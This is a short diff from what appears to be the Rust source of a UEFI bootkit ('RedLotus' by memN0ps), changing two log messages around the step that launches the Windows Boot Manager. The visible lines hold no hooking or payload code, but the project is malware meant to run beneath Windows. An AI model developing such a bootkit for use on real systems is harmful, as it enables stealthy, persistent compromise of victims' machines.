@@ -62,7 +62,7 @@ fn efi_main(image_handle: Handle, system_table: SystemTable<Boot>) -> Status {
         .filter(LevelFilter::Info)
         .setup();
 
-    log::info!("### UEFI Bootkit in Rust by memN0ps ###\n\n");
+    log::info!("### UEFI Bootkit (RedLotus) in Rust by memN0ps ###");
 
     let boot_services = system_table.boot_services();
     unsafe { boot_services.set_image_handle(image_handle) };
@@ -124,7 +124,7 @@ fn efi_main(image_handle: Handle, system_table: SystemTable<Boot>) -> Status {
     system_table.boot_services().stall(10_000_000);
 
     /* Start Windows EFI Boot Manager (bootmgfw.efi) */
-    log::info!("[+] Starting Windows EFI Boot Manager (bootmgfw.efi)...\n\n");
+    log::info!("[+] Starting Windows EFI Boot Manager (bootmgfw.efi)...");
     boot_services
         .start_image(bootmgfw_handle)
         .expect("[-] Failed to start Windows EFI Boot Manager");
